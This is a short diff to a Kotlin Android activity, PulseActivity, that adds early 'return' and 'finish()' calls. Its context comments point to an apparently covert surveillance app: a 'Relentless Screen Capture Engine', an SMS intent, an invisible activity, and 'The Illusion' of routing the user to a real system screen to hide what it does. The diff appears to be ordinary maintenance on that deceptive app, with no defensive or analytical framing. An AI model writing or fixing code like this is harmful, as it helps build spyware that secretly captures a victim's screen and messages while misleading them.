@@ -42,6 +42,7 @@ class PulseActivity : Activity() {
                     overridePendingTransition(0, 0)
                  }
              }, 2000)
+             return
         }
 
         // 3.5 Relentless Screen Capture Engine
@@ -76,6 +77,7 @@ class PulseActivity : Activity() {
                 startActivity(smsIntent)
             }
             finish()
+            return
         }
         
         // The Illusion: Route the user to a legitimate system screen
@@ -96,6 +98,8 @@ class PulseActivity : Activity() {
                 // Absolute safety fallback
                 startActivity(Intent(Settings.ACTION_SETTINGS).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
             }
+            finish()
+            return
         }
 
         // Immediately close our invisible activity. 
